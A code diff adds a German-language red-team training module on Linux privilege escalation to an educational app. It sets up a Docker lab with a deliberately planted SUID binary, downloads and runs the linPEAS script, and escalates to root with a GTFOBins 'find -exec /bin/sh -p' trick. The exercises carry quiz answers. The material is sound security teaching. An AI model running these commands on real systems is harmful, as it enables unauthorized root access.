@@ -174,11 +174,45 @@ export const KALIPRAXIS = [
     ],
     abschluss: 'Die volle Angriffskette: Dienst + Version finden (nmap) → passenden Exploit wählen (Metasploit) → Rechte prüfen (whoami/id). Eine einzige veraltete Version hat gereicht, um Root zu werden. Die Lehre: patchen, patchen, patchen – und immer nur im eigenen Labor üben.',
   },
+  {
+    id: 'privesc', icon: '🧗', titel: 'Rechte-Ausweitung in echt: vom Benutzer zu root', stufe: 'Könner', team: 'Rot',
+    einleitung: 'Du bist „drin" – aber nur als normaler Benutzer. Jetzt der Klassiker: von einem einfachen Konto zu root. Du findest die Fehlkonfiguration automatisch mit linPEAS und nutzt sie mit einem GTFOBins-Trick aus. Das Übungssystem richtest du mit einem Setup-Block selbst ein (so ist es überall gleich und sicher).',
+    ziel: {
+      name: 'Übungs-Linux (Docker, Ubuntu)',
+      start: 'docker run --rm -it ubuntu:24.04 bash\n# Im Container dieses Setup einfügen (normaler Benutzer „anna" + typische Fehlkonfiguration):\napt-get update -qq && apt-get install -y -qq sudo curl >/dev/null\nuseradd -m -s /bin/bash anna && echo anna:anna | chpasswd\necho \'GEHEIM{nur_fuer_root}\' > /root/flag.txt && chmod 600 /root/flag.txt\ncp /usr/bin/find /usr/bin/find-tool && chmod 4755 /usr/bin/find-tool\nsu - anna',
+      hinweis: 'Alles läuft lokal im Container. Nach „su - anna" bist du der normale Benutzer – ab hier beginnt der Angriff. Das echte /root/flag.txt kannst du als anna NICHT lesen (Rechte 600).',
+      pruef: 'Tippe `id` – steht dort „uid=1000(anna)", bist du als normaler Benutzer bereit.',
+    },
+    schritte: [
+      {
+        id: 'peas', werkzeug: 'linPEAS', frage_art: 'abhaken',
+        aufgabe: 'Automatische Aufklärung: Lade linPEAS und lass es das System nach Schwachstellen absuchen. Es markiert Auffälligkeiten farbig.',
+        befehl: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh\nsh linpeas.sh | less -r',
+        erwartet: 'Im Abschnitt „SUID" hebt linPEAS eine ungewöhnliche Datei hervor (nicht aus der Standard-Liste).',
+        frage: 'linPEAS gelaufen und die auffällige SUID-Datei gesehen?', tipp: 'Mit Leertaste blättern, „q" beendet. Rot/gelb = interessant.',
+      },
+      {
+        id: 'suid', werkzeug: 'find', frage_art: 'antwort',
+        aufgabe: 'Finde selbst alle Dateien mit SUID-Recht (laufen mit den Rechten des Besitzers, hier root). Eine davon gehört da nicht hin.',
+        befehl: 'find / -perm -4000 -type f 2>/dev/null',
+        erwartet: 'Neben normalen Systemdateien (passwd, sudo …) taucht eine ungewöhnliche auf.',
+        frage: 'Wie heißt die ungewöhnliche SUID-Datei?', antwort: ['find-tool', '/usr/bin/find-tool'], tipp: 'Sie sieht aus wie ein bekanntes Werkzeug mit angehängtem Namen.',
+      },
+      {
+        id: 'root', werkzeug: 'GTFOBins-Trick', frage_art: 'antwort',
+        aufgabe: 'Nutze die SUID-Datei aus: find kann Befehle starten – mit SUID starten sie als root. „-p" hält die Root-Rechte in der Shell. Dann liest du die nur-für-root-Datei.',
+        befehl: 'find-tool . -exec /bin/sh -p \\; -quit\n# jetzt bist du root:\nid\ncat /root/flag.txt',
+        erwartet: 'id zeigt euid=0 (root), und du kannst /root/flag.txt lesen.',
+        frage: 'Wie lautet der Inhalt von /root/flag.txt?', antwort: ['GEHEIM{nur_fuer_root}', 'nur_fuer_root'], tipp: 'Nach dem find-Trick bist du root – dann cat /root/flag.txt.',
+      },
+    ],
+    abschluss: 'Das ist Rechte-Ausweitung (Privilege Escalation): als normaler Benutzer rein → mit linPEAS die Fehlkonfiguration finden → mit dem GTFOBins-Trick zu root → Geheimnis lesen. Deshalb: SUID-Rechte so sparsam wie möglich, Konfigurationen regelmäßig prüfen – denn die Verteidiger nutzen linPEAS genauso.',
+  },
 ];
 
 // Noch geplante Module dieses Strangs (werden nach und nach gebaut).
 export const KALIPRAXIS_GEPLANT = [
-  { icon: '🧗', titel: 'Rechte-Ausweitung: vom Benutzer zu root (linPEAS)' },
   { icon: '🪟', titel: 'Windows & Active Directory: Grundlagen angreifen' },
   { icon: '📡', titel: 'WLAN & Netzwerk: mitlesen und knacken (aircrack-ng)' },
+  { icon: '🐳', titel: 'Container & Cloud: aus Docker ausbrechen' },
 ];
